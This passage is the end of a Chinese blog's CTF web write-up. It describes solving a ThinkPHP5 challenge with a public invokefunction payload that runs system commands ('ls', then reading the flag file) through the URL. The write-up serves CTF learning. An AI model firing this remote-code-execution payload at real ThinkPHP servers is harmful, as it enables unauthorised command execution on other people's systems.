<li>ThinkPHP 漏洞之一：ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。</li>
<li>shell：<code>find / -name flag</code></li>
</ul>
<h5 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h5><p>第一次遇见ThinkPHP，去Github查阅一下POC，得到如下payload：</p>
<p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code></p>
<p>得到如下回显：</p>
<p><code>favicon.ico index.php robots.txt router.php static static</code>，不太像有flag的样子，不过检验一下漏洞是否可以利用。</p>
<p>接着构造<code>ls /</code>，发现根目录下有flag，cat出来，解决。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CTF-攻防世界-WEB-WP</div>
      <div>https://3xsh0re.github.io/2023/11/13/CTF-攻防世界-WEB-WP/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>3xsh0re</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年11月13日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/" title="0Day安全软件漏洞分析第2版阅读随笔2">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">0Day安全软件漏洞分析第2版阅读随笔2</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" title="x64dbg基础使用指南">
                        <span class="hidden-mobile">x64dbg基础使用指南</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"OYnUsPOOxWtnPXQH1Dxz9wjM-gzGzoHsz","appKey":"GoMWtP1iHSKKpwsbzBlVqJ7P","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
</html>
